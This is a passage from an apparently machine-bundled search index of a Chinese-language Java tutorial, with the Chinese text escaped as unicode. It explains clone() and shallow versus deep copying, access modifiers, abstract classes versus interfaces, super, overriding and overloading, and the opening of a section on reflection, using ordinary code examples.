System.out.println(example.toString());
ToStringExample@4554617c`},{header:"clone()",slug:"clone",content:`1. cloneable
clone() \u662F Object \u7684 protected \u65B9\u6CD5\uFF0C\u5B83\u4E0D\u662F public\uFF0C\u4E00\u4E2A\u7C7B\u4E0D\u663E\u5F0F\u53BB\u91CD\u5199 clone()\uFF0C\u5176\u5B83\u7C7B\u5C31\u4E0D\u80FD\u76F4\u63A5\u53BB\u8C03\u7528\u8BE5\u7C7B\u5B9E\u4F8B\u7684 clone() \u65B9\u6CD5\u3002
public class CloneExample { private int a; private int b;
}
CloneExample e1 = new CloneExample();
// CloneExample e2 = e1.clone(); // 'clone()' has protected access in 'java.lang.Object'
\u91CD\u5199 clone() \u5F97\u5230\u4EE5\u4E0B\u5B9E\u73B0\uFF1A
public class CloneExample { private int a; private int b; @Override public CloneExample clone() throws CloneNotSupportedException { return (CloneExample)super.clone(); }
}
CloneExample e1 = new CloneExample();
try { CloneExample e2 = e1.clone();
} catch (CloneNotSupportedException e) { e.printStackTrace();
}
java.lang.CloneNotSupportedException: CloneExample
\u4EE5\u4E0A\u629B\u51FA\u4E86 CloneNotSupportedException\uFF0C\u8FD9\u662F\u56E0\u4E3A CloneExample \u6CA1\u6709\u5B9E\u73B0 Cloneable \u63A5\u53E3\u3002
\u5E94\u8BE5\u6CE8\u610F\u7684\u662F\uFF0Cclone() \u65B9\u6CD5\u5E76\u4E0D\u662F Cloneable \u63A5\u53E3\u7684\u65B9\u6CD5\uFF0C\u800C\u662F Object \u7684\u4E00\u4E2A protected \u65B9\u6CD5\u3002Cloneable \u63A5\u53E3\u53EA\u662F\u89C4\u5B9A\uFF0C\u5982\u679C\u4E00\u4E2A\u7C7B\u6CA1\u6709\u5B9E\u73B0 Cloneable \u63A5\u53E3\u53C8\u8C03\u7528\u4E86 clone() \u65B9\u6CD5\uFF0C\u5C31\u4F1A\u629B\u51FA CloneNotSupportedException\u3002
public class CloneExample implements Cloneable { private int a; private int b; @Override public Object clone() throws CloneNotSupportedException { return super.clone(); }
}
2. \u6D45\u62F7\u8D1D
\u62F7\u8D1D\u5BF9\u8C61\u548C\u539F\u59CB\u5BF9\u8C61\u7684\u5F15\u7528\u7C7B\u578B\u5F15\u7528\u540C\u4E00\u4E2A\u5BF9\u8C61\u3002
public class ShallowCloneExample implements Cloneable { private int[] arr; public ShallowCloneExample() { arr = new int[10]; for (int i = 0; i < arr.length; i++) { arr[i] = i; } } public void set(int index, int value) { arr[index] = value; } public int get(int index) { return arr[index]; } @Override protected ShallowCloneExample clone() throws CloneNotSupportedException { return (ShallowCloneExample) super.clone(); }
}
ShallowCloneExample e1 = new ShallowCloneExample();
ShallowCloneExample e2 = null;
try { e2 = e1.clone();
} catch (CloneNotSupportedException e) { e.printStackTrace();
}
e1.set(2, 222);
System.out.println(e2.get(2)); // 222
3. \u6DF1\u62F7\u8D1D
\u62F7\u8D1D\u5BF9\u8C61\u548C\u539F\u59CB\u5BF9\u8C61\u7684\u5F15\u7528\u7C7B\u578B\u5F15\u7528\u4E0D\u540C\u5BF9\u8C61\u3002
public class DeepCloneExample implements Cloneable { private int[] arr; public DeepCloneExample() { arr = new int[10]; for (int i = 0; i < arr.length; i++) { arr[i] = i; } } public void set(int index, int value) { arr[index] = value; } public int get(int index) { return arr[index]; } @Override protected DeepCloneExample clone() throws CloneNotSupportedException { DeepCloneExample result = (DeepCloneExample) super.clone(); result.arr = new int[arr.length]; for (int i = 0; i < arr.length; i++) { result.arr[i] = arr[i]; } return result; }
}
DeepCloneExample e1 = new DeepCloneExample();
DeepCloneExample e2 = null;
try { e2 = e1.clone();
} catch (CloneNotSupportedException e) { e.printStackTrace();
}
e1.set(2, 222);
System.out.println(e2.get(2)); // 2
4. clone() \u7684\u66FF\u4EE3\u65B9\u6848
\u4F7F\u7528 clone() \u65B9\u6CD5\u6765\u62F7\u8D1D\u4E00\u4E2A\u5BF9\u8C61\u5373\u590D\u6742\u53C8\u6709\u98CE\u9669\uFF0C\u5B83\u4F1A\u629B\u51FA\u5F02\u5E38\uFF0C\u5E76\u4E14\u8FD8\u9700\u8981\u7C7B\u578B\u8F6C\u6362\u3002Effective Java \u4E66\u4E0A\u8BB2\u5230\uFF0C\u6700\u597D\u4E0D\u8981\u53BB\u4F7F\u7528 clone()\uFF0C\u53EF\u4EE5\u4F7F\u7528\u62F7\u8D1D\u6784\u9020\u51FD\u6570\u6216\u8005\u62F7\u8D1D\u5DE5\u5382\u6765\u62F7\u8D1D\u4E00\u4E2A\u5BF9\u8C61\u3002
public class CloneConstructorExample { private int[] arr; public CloneConstructorExample() { arr = new int[10]; for (int i = 0; i < arr.length; i++) { arr[i] = i; } } public CloneConstructorExample(CloneConstructorExample original) { arr = new int[original.arr.length]; for (int i = 0; i < original.arr.length; i++) { arr[i] = original.arr[i]; } } public void set(int index, int value) { arr[index] = value; } public int get(int index) { return arr[index]; }
}
CloneConstructorExample e1 = new CloneConstructorExample();
CloneConstructorExample e2 = new CloneConstructorExample(e1);
e1.set(2, 222);
System.out.println(e2.get(2)); // 2`},{header:"\u516D\u3001\u7EE7\u627F",slug:"\u516D\u3001\u7EE7\u627F",content:""},{header:"\u8BBF\u95EE\u6743\u9650",slug:"\u8BBF\u95EE\u6743\u9650",content:`Java \u4E2D\u6709\u4E09\u4E2A\u8BBF\u95EE\u6743\u9650\u4FEE\u9970\u7B26\uFF1Aprivate\u3001protected \u4EE5\u53CA public\uFF0C\u5982\u679C\u4E0D\u52A0\u8BBF\u95EE\u4FEE\u9970\u7B26\uFF0C\u8868\u793A\u5305\u7EA7\u53EF\u89C1\u3002
\u53EF\u4EE5\u5BF9\u7C7B\u6216\u7C7B\u4E2D\u7684\u6210\u5458\uFF08\u5B57\u6BB5\u548C\u65B9\u6CD5\uFF09\u52A0\u4E0A\u8BBF\u95EE\u4FEE\u9970\u7B26\u3002 \u7C7B\u53EF\u89C1\u8868\u793A\u5176\u5B83\u7C7B\u53EF\u4EE5\u7528\u8FD9\u4E2A\u7C7B\u521B\u5EFA\u5B9E\u4F8B\u5BF9\u8C61\u3002
\u6210\u5458\u53EF\u89C1\u8868\u793A\u5176\u5B83\u7C7B\u53EF\u4EE5\u7528\u8FD9\u4E2A\u7C7B\u7684\u5B9E\u4F8B\u5BF9\u8C61\u8BBF\u95EE\u5230\u8BE5\u6210\u5458\uFF1B protected \u7528\u4E8E\u4FEE\u9970\u6210\u5458\uFF0C\u8868\u793A\u5728\u7EE7\u627F\u4F53\u7CFB\u4E2D\u6210\u5458\u5BF9\u4E8E\u5B50\u7C7B\u53EF\u89C1\uFF0C\u4F46\u662F\u8FD9\u4E2A\u8BBF\u95EE\u4FEE\u9970\u7B26\u5BF9\u4E8E\u7C7B\u6CA1\u6709\u610F\u4E49\u3002
\u8BBE\u8BA1\u826F\u597D\u7684\u6A21\u5757\u4F1A\u9690\u85CF\u6240\u6709\u7684\u5B9E\u73B0\u7EC6\u8282\uFF0C\u628A\u5B83\u7684 API \u4E0E\u5B83\u7684\u5B9E\u73B0\u6E05\u6670\u5730\u9694\u79BB\u5F00\u6765\u3002\u6A21\u5757\u4E4B\u95F4\u53EA\u901A\u8FC7\u5B83\u4EEC\u7684 API \u8FDB\u884C\u901A\u4FE1\uFF0C\u4E00\u4E2A\u6A21\u5757\u4E0D\u9700\u8981\u77E5\u9053\u5176\u4ED6\u6A21\u5757\u7684\u5185\u90E8\u5DE5\u4F5C\u60C5\u51B5\uFF0C\u8FD9\u4E2A\u6982\u5FF5\u88AB\u79F0\u4E3A\u4FE1\u606F\u9690\u85CF\u6216\u5C01\u88C5\u3002\u56E0\u6B64\u8BBF\u95EE\u6743\u9650\u5E94\u5F53\u5C3D\u53EF\u80FD\u5730\u4F7F\u6BCF\u4E2A\u7C7B\u6216\u8005\u6210\u5458\u4E0D\u88AB\u5916\u754C\u8BBF\u95EE\u3002
\u5982\u679C\u5B50\u7C7B\u7684\u65B9\u6CD5\u91CD\u5199\u4E86\u7236\u7C7B\u7684\u65B9\u6CD5\uFF0C\u90A3\u4E48\u5B50\u7C7B\u4E2D\u8BE5\u65B9\u6CD5\u7684\u8BBF\u95EE\u7EA7\u522B\u4E0D\u5141\u8BB8\u4F4E\u4E8E\u7236\u7C7B\u7684\u8BBF\u95EE\u7EA7\u522B\u3002\u8FD9\u662F\u4E3A\u4E86\u786E\u4FDD\u53EF\u4EE5\u4F7F\u7528\u7236\u7C7B\u5B9E\u4F8B\u7684\u5730\u65B9\u90FD\u53EF\u4EE5\u4F7F\u7528\u5B50\u7C7B\u5B9E\u4F8B\u53BB\u4EE3\u66FF\uFF0C\u4E5F\u5C31\u662F\u786E\u4FDD\u6EE1\u8DB3\u91CC\u6C0F\u66FF\u6362\u539F\u5219\u3002
\u5B57\u6BB5\u51B3\u4E0D\u80FD\u662F\u516C\u6709\u7684\uFF0C\u56E0\u4E3A\u8FD9\u4E48\u505A\u7684\u8BDD\u5C31\u5931\u53BB\u4E86\u5BF9\u8FD9\u4E2A\u5B57\u6BB5\u4FEE\u6539\u884C\u4E3A\u7684\u63A7\u5236\uFF0C\u5BA2\u6237\u7AEF\u53EF\u4EE5\u5BF9\u5176\u968F\u610F\u4FEE\u6539\u3002\u4F8B\u5982\u4E0B\u9762\u7684\u4F8B\u5B50\u4E2D\uFF0CAccessExample \u62E5\u6709 id \u516C\u6709\u5B57\u6BB5\uFF0C\u5982\u679C\u5728\u67D0\u4E2A\u65F6\u523B\uFF0C\u6211\u4EEC\u60F3\u8981\u4F7F\u7528 int \u5B58\u50A8 id \u5B57\u6BB5\uFF0C\u90A3\u4E48\u5C31\u9700\u8981\u4FEE\u6539\u6240\u6709\u7684\u5BA2\u6237\u7AEF\u4EE3\u7801\u3002
public class AccessExample { public String id;
}
\u53EF\u4EE5\u4F7F\u7528\u516C\u6709\u7684 getter \u548C setter \u65B9\u6CD5\u6765\u66FF\u6362\u516C\u6709\u5B57\u6BB5\uFF0C\u8FD9\u6837\u7684\u8BDD\u5C31\u53EF\u4EE5\u63A7\u5236\u5BF9\u5B57\u6BB5\u7684\u4FEE\u6539\u884C\u4E3A\u3002
public class AccessExample { private int id; public String getId() { return id + ""; } public void setId(String id) { this.id = Integer.valueOf(id); }
}
\u4F46\u662F\u4E5F\u6709\u4F8B\u5916\uFF0C\u5982\u679C\u662F\u5305\u7EA7\u79C1\u6709\u7684\u7C7B\u6216\u8005\u79C1\u6709\u7684\u5D4C\u5957\u7C7B\uFF0C\u90A3\u4E48\u76F4\u63A5\u66B4\u9732\u6210\u5458\u4E0D\u4F1A\u6709\u7279\u522B\u5927\u7684\u5F71\u54CD\u3002
public class AccessWithInnerClassExample { private class InnerClass { int x; } private InnerClass innerClass; public AccessWithInnerClassExample() { innerClass = new InnerClass(); } public int getValue() { return innerClass.x; // \u76F4\u63A5\u8BBF\u95EE }
}`},{header:"\u62BD\u8C61\u7C7B\u4E0E\u63A5\u53E3",slug:"\u62BD\u8C61\u7C7B\u4E0E\u63A5\u53E3",content:`1. \u62BD\u8C61\u7C7B
\u62BD\u8C61\u7C7B\u548C\u62BD\u8C61\u65B9\u6CD5\u90FD\u4F7F\u7528 abstract \u5173\u952E\u5B57\u8FDB\u884C\u58F0\u660E\u3002\u5982\u679C\u4E00\u4E2A\u7C7B\u4E2D\u5305\u542B\u62BD\u8C61\u65B9\u6CD5\uFF0C\u90A3\u4E48\u8FD9\u4E2A\u7C7B\u5FC5\u987B\u58F0\u660E\u4E3A\u62BD\u8C61\u7C7B\u3002
\u62BD\u8C61\u7C7B\u548C\u666E\u901A\u7C7B\u6700\u5927\u7684\u533A\u522B\u662F\uFF0C\u62BD\u8C61\u7C7B\u4E0D\u80FD\u88AB\u5B9E\u4F8B\u5316\uFF0C\u53EA\u80FD\u88AB\u7EE7\u627F\u3002
public abstract class AbstractClassExample { protected int x; private int y; public abstract void func1(); public void func2() { System.out.println("func2"); }
}
public class AbstractExtendClassExample extends AbstractClassExample { @Override public void func1() { System.out.println("func1"); }
}
// AbstractClassExample ac1 = new AbstractClassExample(); // 'AbstractClassExample' is abstract; cannot be instantiated
AbstractClassExample ac2 = new AbstractExtendClassExample();
ac2.func1();
2. \u63A5\u53E3
\u63A5\u53E3\u662F\u62BD\u8C61\u7C7B\u7684\u5EF6\u4F38\uFF0C\u5728 Java 8 \u4E4B\u524D\uFF0C\u5B83\u53EF\u4EE5\u770B\u6210\u662F\u4E00\u4E2A\u5B8C\u5168\u62BD\u8C61\u7684\u7C7B\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5B83\u4E0D\u80FD\u6709\u4EFB\u4F55\u7684\u65B9\u6CD5\u5B9E\u73B0\u3002
\u4ECE Java 8 \u5F00\u59CB\uFF0C\u63A5\u53E3\u4E5F\u53EF\u4EE5\u62E5\u6709\u9ED8\u8BA4\u7684\u65B9\u6CD5\u5B9E\u73B0\uFF0C\u8FD9\u662F\u56E0\u4E3A\u4E0D\u652F\u6301\u9ED8\u8BA4\u65B9\u6CD5\u7684\u63A5\u53E3\u7684\u7EF4\u62A4\u6210\u672C\u592A\u9AD8\u4E86\u3002\u5728 Java 8 \u4E4B\u524D\uFF0C\u5982\u679C\u4E00\u4E2A\u63A5\u53E3\u60F3\u8981\u6DFB\u52A0\u65B0\u7684\u65B9\u6CD5\uFF0C\u90A3\u4E48\u8981\u4FEE\u6539\u6240\u6709\u5B9E\u73B0\u4E86\u8BE5\u63A5\u53E3\u7684\u7C7B\uFF0C\u8BA9\u5B83\u4EEC\u90FD\u5B9E\u73B0\u65B0\u589E\u7684\u65B9\u6CD5\u3002
\u63A5\u53E3\u7684\u6210\u5458\uFF08\u5B57\u6BB5 + \u65B9\u6CD5\uFF09\u9ED8\u8BA4\u90FD\u662F public \u7684\uFF0C\u5E76\u4E14\u4E0D\u5141\u8BB8\u5B9A\u4E49\u4E3A private \u6216\u8005 protected\u3002\u4ECE Java 9 \u5F00\u59CB\uFF0C\u5141\u8BB8\u5C06\u65B9\u6CD5\u5B9A\u4E49\u4E3A private\uFF0C\u8FD9\u6837\u5C31\u80FD\u5B9A\u4E49\u67D0\u4E9B\u590D\u7528\u7684\u4EE3\u7801\u53C8\u4E0D\u4F1A\u628A\u65B9\u6CD5\u66B4\u9732\u51FA\u53BB\u3002
\u63A5\u53E3\u7684\u5B57\u6BB5\u9ED8\u8BA4\u90FD\u662F static \u548C final \u7684\u3002
public interface InterfaceExample { void func1(); default void func2(){ System.out.println("func2"); } int x = 123; // int y; // Variable 'y' might not have been initialized public int z = 0; // Modifier 'public' is redundant for interface fields // private int k = 0; // Modifier 'private' not allowed here // protected int l = 0; // Modifier 'protected' not allowed here // private void fun3(); // Modifier 'private' not allowed here
}
public class InterfaceImplementExample implements InterfaceExample { @Override public void func1() { System.out.println("func1"); }
}
// InterfaceExample ie1 = new InterfaceExample(); // 'InterfaceExample' is abstract; cannot be instantiated
InterfaceExample ie2 = new InterfaceImplementExample();
ie2.func1();
System.out.println(InterfaceExample.x);
3. \u6BD4\u8F83 \u4ECE\u8BBE\u8BA1\u5C42\u9762\u4E0A\u770B\uFF0C\u62BD\u8C61\u7C7B\u63D0\u4F9B\u4E86\u4E00\u79CD IS-A \u5173\u7CFB\uFF0C\u9700\u8981\u6EE1\u8DB3\u91CC\u5F0F\u66FF\u6362\u539F\u5219\uFF0C\u5373\u5B50\u7C7B\u5BF9\u8C61\u5FC5\u987B\u80FD\u591F\u66FF\u6362\u6389\u6240\u6709\u7236\u7C7B\u5BF9\u8C61\u3002\u800C\u63A5\u53E3\u66F4\u50CF\u662F\u4E00\u79CD LIKE-A \u5173\u7CFB\uFF0C\u5B83\u53EA\u662F\u63D0\u4F9B\u4E00\u79CD\u65B9\u6CD5\u5B9E\u73B0\u5951\u7EA6\uFF0C\u5E76\u4E0D\u8981\u6C42\u63A5\u53E3\u548C\u5B9E\u73B0\u63A5\u53E3\u7684\u7C7B\u5177\u6709 IS-A \u5173\u7CFB\u3002
\u4ECE\u4F7F\u7528\u4E0A\u6765\u770B\uFF0C\u4E00\u4E2A\u7C7B\u53EF\u4EE5\u5B9E\u73B0\u591A\u4E2A\u63A5\u53E3\uFF0C\u4F46\u662F\u4E0D\u80FD\u7EE7\u627F\u591A\u4E2A\u62BD\u8C61\u7C7B\u3002
\u63A5\u53E3\u7684\u5B57\u6BB5\u53EA\u80FD\u662F static \u548C final \u7C7B\u578B\u7684\uFF0C\u800C\u62BD\u8C61\u7C7B\u7684\u5B57\u6BB5\u6CA1\u6709\u8FD9\u79CD\u9650\u5236\u3002
\u63A5\u53E3\u7684\u6210\u5458\u53EA\u80FD\u662F public \u7684\uFF0C\u800C\u62BD\u8C61\u7C7B\u7684\u6210\u5458\u53EF\u4EE5\u6709\u591A\u79CD\u8BBF\u95EE\u6743\u9650\u3002 4. \u4F7F\u7528\u9009\u62E9
\u4F7F\u7528\u63A5\u53E3\uFF1A \u9700\u8981\u8BA9\u4E0D\u76F8\u5173\u7684\u7C7B\u90FD\u5B9E\u73B0\u4E00\u4E2A\u65B9\u6CD5\uFF0C\u4F8B\u5982\u4E0D\u76F8\u5173\u7684\u7C7B\u90FD\u53EF\u4EE5\u5B9E\u73B0 Comparable \u63A5\u53E3\u4E2D\u7684 compareTo() \u65B9\u6CD5\uFF1B
\u9700\u8981\u4F7F\u7528\u591A\u91CD\u7EE7\u627F\u3002 \u4F7F\u7528\u62BD\u8C61\u7C7B\uFF1A \u9700\u8981\u5728\u51E0\u4E2A\u76F8\u5173\u7684\u7C7B\u4E2D\u5171\u4EAB\u4EE3\u7801\u3002
\u9700\u8981\u80FD\u63A7\u5236\u7EE7\u627F\u6765\u7684\u6210\u5458\u7684\u8BBF\u95EE\u6743\u9650\uFF0C\u800C\u4E0D\u662F\u90FD\u4E3A public\u3002
\u9700\u8981\u7EE7\u627F\u975E\u9759\u6001\u548C\u975E\u5E38\u91CF\u5B57\u6BB5\u3002 \u5728\u5F88\u591A\u60C5\u51B5\u4E0B\uFF0C\u63A5\u53E3\u4F18\u5148\u4E8E\u62BD\u8C61\u7C7B\u3002\u56E0\u4E3A\u63A5\u53E3\u6CA1\u6709\u62BD\u8C61\u7C7B\u4E25\u683C\u7684\u7C7B\u5C42\u6B21\u7ED3\u6784\u8981\u6C42\uFF0C\u53EF\u4EE5\u7075\u6D3B\u5730\u4E3A\u4E00\u4E2A\u7C7B\u6DFB\u52A0\u884C\u4E3A\u3002\u5E76\u4E14\u4ECE Java 8 \u5F00\u59CB\uFF0C\u63A5\u53E3\u4E5F\u53EF\u4EE5\u6709\u9ED8\u8BA4\u7684\u65B9\u6CD5\u5B9E\u73B0\uFF0C\u4F7F\u5F97\u4FEE\u6539\u63A5\u53E3\u7684\u6210\u672C\u4E5F\u53D8\u7684\u5F88\u4F4E\u3002 Abstract Methods and Classes
\u6DF1\u5165\u7406\u89E3 abstract class \u548C interface
When to Use Abstract Class and Interface
Java 9 Private Methods in Interfaces`},{header:"super",slug:"super",content:`\u8BBF\u95EE\u7236\u7C7B\u7684\u6784\u9020\u51FD\u6570\uFF1A\u53EF\u4EE5\u4F7F\u7528 super() \u51FD\u6570\u8BBF\u95EE\u7236\u7C7B\u7684\u6784\u9020\u51FD\u6570\uFF0C\u4ECE\u800C\u59D4\u6258\u7236\u7C7B\u5B8C\u6210\u4E00\u4E9B\u521D\u59CB\u5316\u7684\u5DE5\u4F5C\u3002\u5E94\u8BE5\u6CE8\u610F\u5230\uFF0C\u5B50\u7C7B\u4E00\u5B9A\u4F1A\u8C03\u7528\u7236\u7C7B\u7684\u6784\u9020\u51FD\u6570\u6765\u5B8C\u6210\u521D\u59CB\u5316\u5DE5\u4F5C\uFF0C\u4E00\u822C\u662F\u8C03\u7528\u7236\u7C7B\u7684\u9ED8\u8BA4\u6784\u9020\u51FD\u6570\uFF0C\u5982\u679C\u5B50\u7C7B\u9700\u8981\u8C03\u7528\u7236\u7C7B\u5176\u5B83\u6784\u9020\u51FD\u6570\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u4F7F\u7528 super() \u51FD\u6570\u3002
\u8BBF\u95EE\u7236\u7C7B\u7684\u6210\u5458\uFF1A\u5982\u679C\u5B50\u7C7B\u91CD\u5199\u4E86\u7236\u7C7B\u7684\u67D0\u4E2A\u65B9\u6CD5\uFF0C\u53EF\u4EE5\u901A\u8FC7\u4F7F\u7528 super \u5173\u952E\u5B57\u6765\u5F15\u7528\u7236\u7C7B\u7684\u65B9\u6CD5\u5B9E\u73B0\u3002 public class SuperExample { protected int x; protected int y; public SuperExample(int x, int y) { this.x = x; this.y = y; } public void func() { System.out.println("SuperExample.func()"); }
}
public class SuperExtendExample extends SuperExample { private int z; public SuperExtendExample(int x, int y, int z) { super(x, y); this.z = z; } @Override public void func() { super.func(); System.out.println("SuperExtendExample.func()"); }
}
SuperExample e = new SuperExtendExample(1, 2, 3);
e.func();
SuperExample.func()
SuperExtendExample.func()
Using the Keyword super`},{header:"\u91CD\u5199\u4E0E\u91CD\u8F7D",slug:"\u91CD\u5199\u4E0E\u91CD\u8F7D",content:`1. \u91CD\u5199\uFF08Override\uFF09
\u5B58\u5728\u4E8E\u7EE7\u627F\u4F53\u7CFB\u4E2D\uFF0C\u6307\u5B50\u7C7B\u5B9E\u73B0\u4E86\u4E00\u4E2A\u4E0E\u7236\u7C7B\u5728\u65B9\u6CD5\u58F0\u660E\u4E0A\u5B8C\u5168\u76F8\u540C\u7684\u4E00\u4E2A\u65B9\u6CD5\u3002
\u4E3A\u4E86\u6EE1\u8DB3\u91CC\u5F0F\u66FF\u6362\u539F\u5219\uFF0C\u91CD\u5199\u6709\u4EE5\u4E0B\u4E09\u4E2A\u9650\u5236\uFF1A \u5B50\u7C7B\u65B9\u6CD5\u7684\u8BBF\u95EE\u6743\u9650\u5FC5\u987B\u5927\u4E8E\u7B49\u4E8E\u7236\u7C7B\u65B9\u6CD5\uFF1B
\u5B50\u7C7B\u65B9\u6CD5\u7684\u8FD4\u56DE\u7C7B\u578B\u5FC5\u987B\u662F\u7236\u7C7B\u65B9\u6CD5\u8FD4\u56DE\u7C7B\u578B\u6216\u4E3A\u5176\u5B50\u7C7B\u578B\u3002
\u5B50\u7C7B\u65B9\u6CD5\u629B\u51FA\u7684\u5F02\u5E38\u7C7B\u578B\u5FC5\u987B\u662F\u7236\u7C7B\u629B\u51FA\u5F02\u5E38\u7C7B\u578B\u6216\u4E3A\u5176\u5B50\u7C7B\u578B\u3002 \u4F7F\u7528 @Override \u6CE8\u89E3\uFF0C\u53EF\u4EE5\u8BA9\u7F16\u8BD1\u5668\u5E2E\u5FD9\u68C0\u67E5\u662F\u5426\u6EE1\u8DB3\u4E0A\u9762\u7684\u4E09\u4E2A\u9650\u5236\u6761\u4EF6\u3002
\u4E0B\u9762\u7684\u793A\u4F8B\u4E2D\uFF0CSubClass \u4E3A SuperClass \u7684\u5B50\u7C7B\uFF0CSubClass \u91CD\u5199\u4E86 SuperClass \u7684 func() \u65B9\u6CD5\u3002\u5176\u4E2D\uFF1A \u5B50\u7C7B\u65B9\u6CD5\u8BBF\u95EE\u6743\u9650\u4E3A public\uFF0C\u5927\u4E8E\u7236\u7C7B\u7684 protected\u3002
\u5B50\u7C7B\u7684\u8FD4\u56DE\u7C7B\u578B\u4E3A ArrayList<Integer>\uFF0C\u662F\u7236\u7C7B\u8FD4\u56DE\u7C7B\u578B List<Integer> \u7684\u5B50\u7C7B\u3002
\u5B50\u7C7B\u629B\u51FA\u7684\u5F02\u5E38\u7C7B\u578B\u4E3A Exception\uFF0C\u662F\u7236\u7C7B\u629B\u51FA\u5F02\u5E38 Throwable \u7684\u5B50\u7C7B\u3002
\u5B50\u7C7B\u91CD\u5199\u65B9\u6CD5\u4F7F\u7528 @Override \u6CE8\u89E3\uFF0C\u4ECE\u800C\u8BA9\u7F16\u8BD1\u5668\u81EA\u52A8\u68C0\u67E5\u662F\u5426\u6EE1\u8DB3\u9650\u5236\u6761\u4EF6\u3002 class SuperClass { protected List<Integer> func() throws Throwable { return new ArrayList<>(); }
} class SubClass extends SuperClass { @Override public ArrayList<Integer> func() throws Exception { return new ArrayList<>(); }
}
\u5728\u8C03\u7528\u4E00\u4E2A\u65B9\u6CD5\u65F6\uFF0C\u5148\u4ECE\u672C\u7C7B\u4E2D\u67E5\u627E\u770B\u662F\u5426\u6709\u5BF9\u5E94\u7684\u65B9\u6CD5\uFF0C\u5982\u679C\u6CA1\u6709\u518D\u5230\u7236\u7C7B\u4E2D\u67E5\u770B\uFF0C\u770B\u662F\u5426\u4ECE\u7236\u7C7B\u7EE7\u627F\u6765\u3002\u5426\u5219\u5C31\u8981\u5BF9\u53C2\u6570\u8FDB\u884C\u8F6C\u578B\uFF0C\u8F6C\u6210\u7236\u7C7B\u4E4B\u540E\u770B\u662F\u5426\u6709\u5BF9\u5E94\u7684\u65B9\u6CD5\u3002\u603B\u7684\u6765\u8BF4\uFF0C\u65B9\u6CD5\u8C03\u7528\u7684\u4F18\u5148\u7EA7\u4E3A\uFF1A this.func(this)
super.func(this)
this.func(super)
super.func(super) /* A | B | C | D */ class A { public void show(A obj) { System.out.println("A.show(A)"); } public void show(C obj) { System.out.println("A.show(C)"); }
} class B extends A { @Override public void show(A obj) { System.out.println("B.show(A)"); }
} class C extends B {
} class D extends C {
}
public static void main(String[] args) { A a = new A(); B b = new B(); C c = new C(); D d = new D(); // \u5728 A \u4E2D\u5B58\u5728 show(A obj)\uFF0C\u76F4\u63A5\u8C03\u7528 a.show(a); // A.show(A) // \u5728 A \u4E2D\u4E0D\u5B58\u5728 show(B obj)\uFF0C\u5C06 B \u8F6C\u578B\u6210\u5176\u7236\u7C7B A a.show(b); // A.show(A) // \u5728 B \u4E2D\u5B58\u5728\u4ECE A \u7EE7\u627F\u6765\u7684 show(C obj)\uFF0C\u76F4\u63A5\u8C03\u7528 b.show(c); // A.show(C) // \u5728 B \u4E2D\u4E0D\u5B58\u5728 show(D obj)\uFF0C\u4F46\u662F\u5B58\u5728\u4ECE A \u7EE7\u627F\u6765\u7684 show(C obj)\uFF0C\u5C06 D \u8F6C\u578B\u6210\u5176\u7236\u7C7B C b.show(d); // A.show(C) // \u5F15\u7528\u7684\u8FD8\u662F B \u5BF9\u8C61\uFF0C\u6240\u4EE5 ba \u548C b \u7684\u8C03\u7528\u7ED3\u679C\u4E00\u6837 A ba = new B(); ba.show(c); // A.show(C) ba.show(d); // A.show(C)
}
2. \u91CD\u8F7D\uFF08Overload\uFF09
\u5B58\u5728\u4E8E\u540C\u4E00\u4E2A\u7C7B\u4E2D\uFF0C\u6307\u4E00\u4E2A\u65B9\u6CD5\u4E0E\u5DF2\u7ECF\u5B58\u5728\u7684\u65B9\u6CD5\u540D\u79F0\u4E0A\u76F8\u540C\uFF0C\u4F46\u662F\u53C2\u6570\u7C7B\u578B\u3001\u4E2A\u6570\u3001\u987A\u5E8F\u81F3\u5C11\u6709\u4E00\u4E2A\u4E0D\u540C\u3002
\u5E94\u8BE5\u6CE8\u610F\u7684\u662F\uFF0C\u8FD4\u56DE\u503C\u4E0D\u540C\uFF0C\u5176\u5B83\u90FD\u76F8\u540C\u4E0D\u7B97\u662F\u91CD\u8F7D\u3002
class OverloadingExample { public void show(int x) { System.out.println(x); } public void show(int x, String y) { System.out.println(x + " " + y); }
}
public static void main(String[] args) { OverloadingExample example = new OverloadingExample(); example.show(1); example.show(1, "2");
}`},{header:"\u4E03\u3001\u53CD\u5C04",slug:"\u4E03\u3001\u53CD\u5C04",content:`\u6BCF\u4E2A\u7C7B\u90FD\u6709\u4E00\u4E2A Class \u5BF9\u8C61\uFF0C\u5305\u542B\u4E86\u4E0E\u7C7B\u6709\u5173\u7684\u4FE1\u606F\u3002\u5F53\u7F16\u8BD1\u4E00\u4E2A\u65B0\u7C7B\u65F6\uFF0C\u4F1A\u4EA7\u751F\u4E00\u4E2A\u540C\u540D\u7684 .class \u6587\u4EF6\uFF0C\u8BE5\u6587\u4EF6\u5185\u5BB9\u4FDD\u5B58\u7740 Class \u5BF9\u8C61\u3002
\u7C7B\u52A0\u8F7D\u76F8\u5F53\u4E8E Class \u5BF9\u8C61\u7684\u52A0\u8F7D\uFF0C\u7C7B\u5728\u7B2C\u4E00\u6B21\u4F7F\u7528\u65F6\u624D\u52A8\u6001\u52A0\u8F7D\u5230 JVM \u4E2D\u3002\u4E5F\u53EF\u4EE5\u4F7F\u7528 Class.forName("com.mysql.jdbc.Driver") \u8FD9\u79CD\u65B9\u5F0F\u6765\u63A7\u5236\u7C7B\u7684\u52A0\u8F7D\uFF0C\u8BE5\u65B9\u6CD5\u4F1A\u8FD4\u56DE\u4E00\u4E2A Class \u5BF9\u8C61\u3002
\u53CD\u5C04\u53EF\u4EE5\u63D0\u4F9B\u8FD0\u884C\u65F6\u7684\u7C7B\u4FE1\u606F\uFF0C\u5E76\u4E14\u8FD9\u4E2A\u7C7B\u53EF\u4EE5\u5728\u8FD0\u884C\u65F6\u624D\u52A0\u8F7D\u8FDB\u6765\uFF0C\u751A\u81F3\u5728\u7F16\u8BD1\u65F6\u671F\u8BE5\u7C7B\u7684 .class \u4E0D\u5B58\u5728\u4E5F\u53EF\u4EE5\u52A0\u8F7D\u8FDB\u6765\u3002
Class \u548C java.lang.reflect \u4E00\u8D77\u5BF9\u53CD\u5C04\u63D0\u4F9B\u4E86\u652F\u6301\uFF0Cjava.lang.reflect \u7C7B\u5E93\u4E3B\u8981\u5305\u542B\u4E86\u4EE5\u4E0B\u4E09\u4E2A\u7C7B\uFF1A Field \uFF1A\u53EF\u4EE5\u4F7F\u7528 get() \u548C set() \u65B9\u6CD5\u8BFB\u53D6\u548C\u4FEE\u6539 Field \u5BF9\u8C61\u5173\u8054\u7684\u5B57\u6BB5\uFF1B
